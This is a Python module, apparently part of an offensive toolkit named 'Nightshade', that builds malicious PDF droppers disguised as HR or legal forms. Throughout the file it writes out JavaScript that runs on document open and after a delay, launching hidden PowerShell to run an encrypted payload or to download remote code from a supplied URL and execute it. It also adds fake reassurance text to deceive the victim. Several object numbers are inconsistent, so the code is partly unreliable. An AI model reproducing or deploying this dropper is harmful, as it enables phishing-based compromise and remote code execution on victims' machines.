"""
Nightshade PDF Dropper Generator.
Creates PDF files with OpenAction JavaScript payload execution.
Uses realistic HR/legal forms as social engineering lures.
All PDF strings are properly escaped for parentheses, backslashes, and special chars.
"""
import os
import random
import time
import re
from typing import Optional
from ..core.crypto import NightshadeCrypto
from .templates import SocialEngineeringTemplates


class PDFDropper:
    """Generate a PDF with embedded JavaScript that fetches and executes a payload."""

    def __init__(self, crypto: NightshadeCrypto, payload_b64: str):
        self._crypto = crypto
        self._payload_b64 = payload_b64
        self._template = SocialEngineeringTemplates.random_pdf_template()

    @staticmethod
    def _random_hex(length: int = 32) -> str:
        return "".join(random.choices("0123456789ABCDEF", k=length))

    @staticmethod
    def _escape_pdf_string(s: str) -> str:
        """Escape a string for PDF bytestring literal.
        
        PDF string literals use (...). Must escape:
          - left-paren to backslash+left-paren
          - right-paren to backslash+right-paren
          - backslash to double backslash
        Also handle unicode and control characters.
        """
        result = []
        for ch in s:
            if ch == '(':
                result.append(r'\(')
            elif ch == ')':
                result.append(r'\)')
            elif ch == '\\':
                result.append(r'\\')
            elif ord(ch) < 32 or ord(ch) > 126:
                # Encode non-ASCII and control chars as octal escapes
                result.append(f'\\{ord(ch):03o}')
            else:
                result.append(ch)
        return ''.join(result)

    def _build_js(self, template_url: str) -> str:
        """Build the JavaScript that will execute when the PDF opens."""
        encrypted_stage = self._crypto.encrypt(self._payload_b64)
        title_escaped = self._escape_pdf_string(self._template["title"])
        url_escaped = self._escape_pdf_string(template_url)
        stage_escaped = self._escape_pdf_string(encrypted_stage)
        
        return f'''
        var url = "{url_escaped}";
        var b64 = "{stage_escaped}";
        
        try {{
            var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
            xhr.open("GET", url, false);
            xhr.send();
            if (xhr.status == 200) {{
                var shell = new ActiveXObject("WScript.Shell");
                var cmd = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + b64;
                shell.Run(cmd, 0, false);
            }}
        }} catch(e) {{}}
        
        try {{
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"$u='" + url + "';$d=(New-Object Net.WebClient).DownloadString($u);iex $d\\"", 0, false);
        }} catch(e) {{}}
        
        app.alert("{title_escaped} - Document processed successfully.", 1);
'''

    def build(self, output_path: str, template_url: str):
        """Assemble the PDF with embedded JavaScript."""
        pdf_id = self._random_hex()
        three_random = self._random_hex(8)
        creation_date = time.strftime("D:%Y%m%d%H%M%S+00'00'")
        js_code = self._build_js(template_url)
        
        title = self._template["title"]
        subtitle = self._template["subtitle"]
        fields = self._template.get("fields", [])
        body = self._template.get("body", [])
        
        title_esc = self._escape_pdf_string(title)
        subtitle_esc = self._escape_pdf_string(subtitle)
        body_esc = [self._escape_pdf_string(line) for line in body]
        fields_esc = [self._escape_pdf_string(f) for f in fields]
        
        js_code_clean = js_code.replace('\n', '\n').replace('\r', '')
        js_escaped = self._escape_pdf_string(js_code_clean)
        
        # Build PDF objects
        objects = []

        # Object 1: Catalog
        objects.append(f"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
/AcroForm 4 0 R
/Names 5 0 R
>>
endobj""")

        # Object 2: Pages
        objects.append(f"""2 0 obj
<<
/Type /Pages
/Kids [6 0 R]
/Count 1
>>
endobj""")

        # Object 3: OpenAction JavaScript
        objects.append(f"""3 0 obj
<<
/Type /Action
/S /JavaScript
/JS ({js_code_clean})
>>
endobj""")

        # Object 4: AcroForm with field references
        annot_refs = " ".join(f"{8 + i} 0 R" for i in range(len(fields)))
        objects.append(f"""4 0 obj
<<
/Fields [{annot_refs}]
/DA (/Helv 0 Tf 0 g)
/NeedAppearances true
>>
endobj""")

        # Object 5: Names -> JavaScript
        objects.append(f"""5 0 obj
<<
/JavaScript 8 0 R
>>
endobj""")

        # Object 6: Page
        annot_refs = " ".join(f"{8 + i} 0 R" for i in range(len(fields)))
        objects.append(f"""6 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [{annot_refs}]
/Contents 7 0 R
/Resources <<
    /Font <<
        /F1 10 0 R
    >>
>>
>>
endobj""")

        # Object 7: Page content stream
        form_y = 720
        content_lines = [
            "BT",
            "/F1 18 Tf",
            f"72 {form_y} Td",
            f"({title_esc}) Tj",
        ]
        form_y -= 30
        content_lines.extend([
            f"72 {form_y} Td",
            "/F1 11 Tf",
            f"({subtitle_esc}) Tj",
        ])
        form_y -= 25
        for line in body_esc:
            if line == "":
                form_y -= 12
                continue
            content_lines.extend([
                f"72 {form_y} Td",
                "/F1 10 Tf",
                f"({line}) Tj",
            ])
            form_y -= 14

        form_y -= 20
        for field_name in fields_esc:
            form_y -= 22
            content_lines.extend([
                f"72 {form_y} Td",
                "/F1 10 Tf",
                f"({field_name}: ___________________________) Tj",
            ])

        form_y -= 30
        content_lines.extend([
            f"72 {form_y} Td",
            "/F1 8 Tf",
            "(This document includes security validation features.) Tj",
            "ET",
        ])

        content_stream = "\n".join(content_lines)
        content_length = len(content_stream.encode("latin-1"))
        objects.append(f"""7 0 obj
<<
/Length {content_length}
>>
stream
{content_stream}
endstream
endobj""")

        # Object 8: JavaScript name tree
        objects.append(f"""8 0 obj
<<
/Names [
    (EmbeddedJS) 9 0 R
]
>>
endobj""")

        # Delayed JS safety net
        delayed_url = self._escape_pdf_string(template_url)
        objects.append(f"""9 0 obj
<<
/JS (
    setTimeout(function(){{
        try {{
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("powershell -Command Start-Sleep -Seconds 5; try {{ Invoke-WebRequest '{delayed_url}' -UseBasicParsing | Invoke-Expression }} catch {{}}", 0, false);
        }} catch(e) {{}}
    }}, 8000);
)
/S /JavaScript
>>
endobj""")

        # Object 10: Font
        objects.append(f"""10 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
endobj""")

        # Form field widgets for each field (11+)
        for idx, field_name in enumerate(fields_esc):
            obj_num = 11 + idx
            rect_y = 600 - (idx * 50)
            objects.append(f"""{obj_num} 0 obj
<<
/FT /Tx
/T ({field_name})
/Rect [72 {rect_y} 400 {rect_y - 20}]
/BS << /W 1 /S /S >>
/MK << /BC [0 0 0] >>
/Type /Annot
/Subtype /Widget
/DA (/Helv 12 Tf 0 g)
/F 4
/P 6 0 R
>>
endobj""")

        # Build PDF file
        obj_count = len(objects)
        offsets = []
        pdf_content = "%PDF-1.7\n%\x00\x00\x00\x00\n"

        for i, obj in enumerate(objects):
            offsets.append(len(pdf_content))
            pdf_content += f"{obj}\n"

        xref_offset = len(pdf_content)
        pdf_content += "xref\n"
        pdf_content += f"0 {obj_count + 1}\n"
        pdf_content += "0000000000 65535 f \n"
        for offset in offsets:
            pdf_content += f"{offset:010d} 00000 n \n"

        pdf_content += "trailer\n"
        pdf_content += f"<< /Size {obj_count + 1} /Root 1 0 R /ID [<{pdf_id}> <{pdf_id}>] >>\n"
        pdf_content += "startxref\n"
        pdf_content += f"{xref_offset}\n"
        pdf_content += "%%EOF\n"

        with open(output_path, "wb") as f:
            f.write(pdf_content.encode("latin-1"))

        print(f"\n[+] PDF dropper created: {output_path}")
        print(f"[+] Lure: {title}")
        print(f"[+] Fields: {', '.join(fields)}")
        print(f"[+] Template URL: {template_url}")
        print(f"[+] Technique: OpenAction JS + secondary delayed JS")
